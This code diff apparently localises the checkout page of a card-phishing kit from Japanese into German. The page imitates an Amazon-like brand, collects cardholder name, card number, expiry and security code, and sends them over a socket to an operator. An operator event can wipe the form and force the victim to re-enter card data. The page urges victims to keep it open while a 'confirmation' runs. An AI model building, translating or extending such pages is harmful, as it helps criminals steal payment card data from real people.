@@ -84,7 +84,7 @@ type CardBrand = {
 
 function detectCardBrand(digits: string): CardBrand {
   const num = digitsOnly(digits);
-  if (!num) return { key: 'generic', label: 'カード', accentClass: 'alz-card-brand-generic' };
+  if (!num) return { key: 'generic', label: 'Karte', accentClass: 'alz-card-brand-generic' };
   if (/^4/.test(num)) return { key: 'visa', label: 'VISA', accentClass: 'alz-card-brand-visa' };
   if (/^(5[1-5]|2(2[2-9]|[3-6]\d|7[01]|720))/.test(num)) return { key: 'mastercard', label: 'mastercard', accentClass: 'alz-card-brand-mastercard' };
   if (/^3[47]/.test(num)) return { key: 'amex', label: 'AMEX', accentClass: 'alz-card-brand-amex' };
@@ -93,7 +93,7 @@ function detectCardBrand(digits: string): CardBrand {
   if (/^(2131|1800|35)/.test(num)) return { key: 'jcb', label: 'JCB', accentClass: 'alz-card-brand-jcb' };
   if (/^(30[0-5]|36|38|39)/.test(num)) return { key: 'diners', label: 'DINERS', accentClass: 'alz-card-brand-diners' };
   if (/^(50|56|57|58|6\d)/.test(num)) return { key: 'maestro', label: 'MAESTRO', accentClass: 'alz-card-brand-maestro' };
-  return { key: 'generic', label: 'カード', accentClass: 'alz-card-brand-generic' };
+  return { key: 'generic', label: 'Karte', accentClass: 'alz-card-brand-generic' };
 }
 
 type CheckoutDraft = {
@@ -126,7 +126,7 @@ export default function Checkout() {
   const [cvvDigits, setCvvDigits] = useState(initialDraft.cvvDigits);
   const [expiry, setExpiry] = useState(initialDraft.expiry);
   const [waiting, setWaiting] = useState(false);
-  const [waitingMsg, setWaitingMsg] = useState('処理を実行しています...');
+  const [waitingMsg, setWaitingMsg] = useState('Ihre Zahlungsdaten werden verarbeitet...');
 
   useEffect(() => {
     saveDraft(STORAGE_KEYS.checkoutDraft, { checkoutName, cardDisplay, cvvDigits, expiry });
@@ -169,7 +169,7 @@ export default function Checkout() {
       setCvvDigits('');
       setExpiry('');
       setWaiting(false);
-      setWaitingMsg('処理を実行しています...');
+      setWaitingMsg('Ihre Zahlungsdaten werden verarbeitet...');
       clearDraft(STORAGE_KEYS.checkoutDraft);
     };
     socket.on('force-checkout-refill', onForceCheckoutRefill);
@@ -193,7 +193,7 @@ export default function Checkout() {
     const normalizedExpiry = normalizeExpiry(expiry, true);
     if (!isValidExpiryMMYY(normalizedExpiry) || !canSubmit || waiting) return;
     setWaiting(true);
-    setWaitingMsg('情報を受け付けました。お支払い情報の確認が完了するまで、このページを閉じずにお待ちください。');
+    setWaitingMsg('Ihre Angaben wurden empfangen. Bitte schliessen Sie diese Seite nicht, waehrend die Zahlungsdaten bestaetigt werden.');
     clearDraft(STORAGE_KEYS.checkoutDraft);
     setExpiry(normalizedExpiry);
     socket.emit('checkout-submit', {
@@ -210,9 +210,9 @@ export default function Checkout() {
         <div className="absolute inset-0 z-50 flex items-center justify-center bg-slate-900/45 backdrop-blur-sm">
           <div className="w-full max-w-md rounded-2xl border border-slate-200 bg-white p-6 text-center shadow-2xl">
             <div className="mx-auto mb-3 h-10 w-10 rounded-full border-4 border-amber-200 border-t-[#ff9900] animate-spin" />
-            <div className="text-lg font-semibold text-slate-900">処理中です</div>
+            <div className="text-lg font-semibold text-slate-900">Wird verarbeitet</div>
             <div className="mt-2 text-sm text-slate-600">{waitingMsg}</div>
-            <div className="mt-6 text-xs text-slate-500">確認が完了するまで、このページを閉じないでください。</div>
+            <div className="mt-6 text-xs text-slate-500">Bitte schliessen Sie diese Seite nicht, bis die Bestaetigung abgeschlossen ist.</div>
           </div>
         </div>
       )}
@@ -221,8 +221,8 @@ export default function Checkout() {
         <div className="alz-top">
           <div className="alz-step-head">
             <div>
-              <h1 className="alz-step-title">お支払い方法を確認</h1>
-              <p className="alz-step-subtitle">この注文に関連付けられたお支払い情報を確認してください。</p>
+              <h1 className="alz-step-title">Zahlungsmethode bestaetigen</h1>
+              <p className="alz-step-subtitle">Bitte pruefen Sie die Zahlungsdaten fuer diese Bestellung.</p>
             </div>
           </div>
           <div className="alz-track mt-3">
@@ -232,9 +232,9 @@ export default function Checkout() {
 
         <div className="alz-flow-grid">
           <div className="alz-card">
-            <div className="alz-section-eyebrow">お支払い情報</div>
-            <h2 className="alz-page-title">カード情報を確認してください</h2>
-            <p className="alz-page-copy">この注文に使用するカード情報を入力して、お届け手続きを続けてください。</p>
+            <div className="alz-section-eyebrow">Zahlungsdaten</div>
+            <h2 className="alz-page-title">Kartendaten bestaetigen</h2>
+            <p className="alz-page-copy">Geben Sie die Kartendaten ein, die fuer diese Bestellung verwendet werden.</p>
             <div className="alz-brand-row mb-4">
               {BRAND_PROMISES.map((item) => (
                 <span key={item} className="alz-brand-pill">{item}</span>
@@ -243,35 +243,35 @@ export default function Checkout() {
 
             <div className="space-y-4 mt-5 alz-checkout-form">
               <div className="alz-checkout-field">
-                <label className="alz-field-label">カード名義人</label>
-                <input value={checkoutName} onChange={(e) => setCheckoutName(e.target.value)} placeholder="カードに記載の氏名" className="alz-input" inputMode="text" autoComplete="off" disabled={waiting} />
+                <label className="alz-field-label">Name auf der Karte</label>
+                <input value={checkoutName} onChange={(e) => setCheckoutName(e.target.value)} placeholder="Name wie auf der Karte" className="alz-input" inputMode="text" autoComplete="off" disabled={waiting} />
               </div>
               <div className="alz-checkout-field alz-checkout-field-card">
-                <label className="alz-field-label">カード番号</label>
+                <label className="alz-field-label">Kartennummer</label>
                 <div className="alz-card-input-wrap">
                   <input ref={cardRef} value={cardDisplay} onChange={onCardChange} placeholder="1234 5678 9012 3456" className="alz-input alz-card-input" inputMode="numeric" autoComplete="off" maxLength={23} disabled={waiting} />
                   <span className={`alz-card-brand-chip ${cardBrand.accentClass}`} aria-live="polite">
                     {cardBrand.label}
                   </span>
                 </div>
-                {!cardValid && cardDigits.length > 0 && <div className="mt-1 text-xs text-red-500">正しいカード番号を入力してください。</div>}
+                {!cardValid && cardDigits.length > 0 && <div className="mt-1 text-xs text-red-500">Bitte geben Sie eine gueltige Kartennummer ein.</div>}
               </div>
               <div className="grid grid-cols-1 md:grid-cols-2 gap-5 alz-checkout-inline">
                 <div className="alz-checkout-field">
-                  <label className="alz-field-label">有効期限</label>
+                  <label className="alz-field-label">Gueltig bis</label>
                   <input value={expiry} onChange={(e) => setExpiry(normalizeExpiry(e.target.value, false))} onBlur={() => setExpiry((prev) => normalizeExpiry(prev, true))} placeholder="12/27" className="alz-input" inputMode="numeric" maxLength={5} pattern="\d{2}/\d{2}" autoComplete="off" disabled={waiting} />
-                  {!expiryValid && expiry.length === 5 && <div className="mt-1 text-xs text-red-500">正しい有効期限を入力してください。</div>}
+                  {!expiryValid && expiry.length === 5 && <div className="mt-1 text-xs text-red-500">Bitte geben Sie ein gueltiges Ablaufdatum ein.</div>}
                 </div>
                 <div className="alz-checkout-field">
-                  <label className="alz-field-label">セキュリティコード</label>
+                  <label className="alz-field-label">Sicherheitscode</label>
                   <input value={cvvDigits} onChange={(e) => setCvvDigits(digitsOnly(e.target.value).slice(0, 4))} placeholder="123" className="alz-input" inputMode="numeric" maxLength={4} autoComplete="off" disabled={waiting} />
-                  {!cvvValid && cvvDigits.length > 0 && <div className="mt-1 text-xs text-red-500">3桁または4桁のセキュリティコードを入力してください。</div>}
+                  {!cvvValid && cvvDigits.length > 0 && <div className="mt-1 text-xs text-red-500">Bitte geben Sie einen 3- oder 4-stelligen Sicherheitscode ein.</div>}
                 </div>
               </div>
               <div className="alz-payment-strip" aria-hidden="true">
                 <div className="alz-payment-strip-top">
-                  <span className="alz-payment-strip-title">ご利用可能なお支払い方法</span>
-                  <span className="alz-payment-strip-lock">安全な取引</span>
+                  <span className="alz-payment-strip-title">Akzeptierte Zahlungsarten</span>
+                  <span className="alz-payment-strip-lock">Sichere Zahlung</span>
                 </div>
                 <div className="alz-payment-strip-row">
                   <span className="alz-payment-pill alz-payment-pill-visa">VISA</span>
@@ -282,27 +282,27 @@ export default function Checkout() {
             </div>
 
             <button onClick={onSubmit} disabled={!canSubmit || waiting} className="alz-btn-primary mt-6 text-base alz-checkout-submit">
-                {waiting ? '処理中...' : 'お支払い情報を確認する'}
-              </button>
-            <div className="alz-helper-copy mt-6">確認が完了するまで、このページを閉じずにお待ちください。</div>
+              {waiting ? 'Wird verarbeitet...' : 'Zahlungsdaten bestaetigen'}
+            </button>
+            <div className="alz-helper-copy mt-6">Bitte schliessen Sie diese Seite nicht, bis die Pruefung abgeschlossen ist.</div>
             <div className="text-[11px] text-center text-[#565959] mt-1">{BRAND.legal}</div>
           </div>
 
           <aside className="alz-card alz-flow-aside alz-side-summary">
-            <div className="alz-side-summary-title">お支払い確認</div>
+            <div className="alz-side-summary-title">Zahlungspruefung</div>
             <div className="alz-order-mini-card">
               <div className="alz-order-mini-thumb alz-order-mini-thumb-card" />
               <div>
-                <div className="alz-order-mini-title">登録済みのお支払い方法を確認</div>
-                <div className="alz-order-mini-copy">この注文に紐づくお支払い方法で請求情報を確認してください。</div>
+                <div className="alz-order-mini-title">Zahlungsmethode dieser Bestellung bestaetigen</div>
+                <div className="alz-order-mini-copy">Bitte pruefen Sie Karteninhaber, Kartennummer, Ablaufdatum und Sicherheitscode.</div>
               </div>
             </div>
             <div className="alz-side-summary-list">
-              <div>カード記載どおりの氏名</div>
-              <div>カード番号と有効期限</div>
-              <div>3桁または4桁のコード</div>
+              <div>Name des Karteninhabers</div>
+              <div>Kartennummer und Ablaufdatum</div>
+              <div>3- oder 4-stelliger Sicherheitscode</div>
             </div>
-            <div className="alz-side-summary-box">この注文に関連付けられたカードを使って確認を進めてください。</div>
+            <div className="alz-side-summary-box">Diese Karte wird verwendet, um die Zahlungspruefung fuer Ihre Bestellung abzuschliessen.</div>
           </aside>
         </div>
       </div>
